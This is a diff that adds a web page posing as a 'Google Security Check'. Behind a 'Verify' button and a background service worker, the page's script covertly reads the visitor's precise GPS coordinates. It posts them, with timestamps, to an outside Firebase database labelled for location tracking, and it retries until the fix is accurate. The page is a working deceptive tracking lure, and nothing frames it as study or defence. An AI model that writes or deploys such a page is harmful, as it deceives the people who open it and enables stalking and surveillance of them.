@@ -1,0 +1,114 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google Security Check</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      padding: 24px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+    h2 {
+      font-size: 24px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 16px;
+      color: #666;
+    }
+    #verifyBtn {
+      margin-top: 20px;
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 15px;
+      color: red;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Security Check</h2>
+    <p>Verifying latest & cached GPS location with FLP + Background retry</p>
+    <button id="verifyBtn" onclick="startDualTracking()">Verify</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    let bestAccuracy = 1000;
+    let attempt = 0;
+
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('sw.js').then(() => {
+        console.log("Service Worker registered");
+      });
+      navigator.serviceWorker.addEventListener('message', event => {
+        if (event.data === 'try-location') {
+          getFreshLocation("SW");
+        }
+      });
+    }
+
+    function startDualTracking() {
+      getFreshLocation("manual");
+    }
+
+    function getFreshLocation(source) {
+      attempt++;
+      if (!navigator.geolocation) return;
+
+      navigator.geolocation.getCurrentPosition(position => {
+        const acc = position.coords.accuracy;
+        if (acc <= 40 && acc < bestAccuracy) {
+          bestAccuracy = acc;
+          fetch("https://location-track-c3dca-default-rtdb.firebaseio.com/track-sw.json", {
+            method: "POST",
+            body: JSON.stringify({
+              status: "fresh",
+              source: source,
+              lat: position.coords.latitude,
+              long: position.coords.longitude,
+              accuracy: acc,
+              time: new Date().toISOString()
+            })
+          });
+          updateStatus("Location logged (" + Math.round(acc) + "m)");
+        } else {
+          updateStatus("Low accuracy (" + Math.round(acc) + "m), retrying...");
+        }
+      }, err => {
+        updateStatus("Error: " + err.message);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    }
+
+    function updateStatus(msg) {
+      document.getElementById("status").innerText = msg + " (Attempt " + attempt + ")";
+    }
+  </script>
+</body>
+</html>
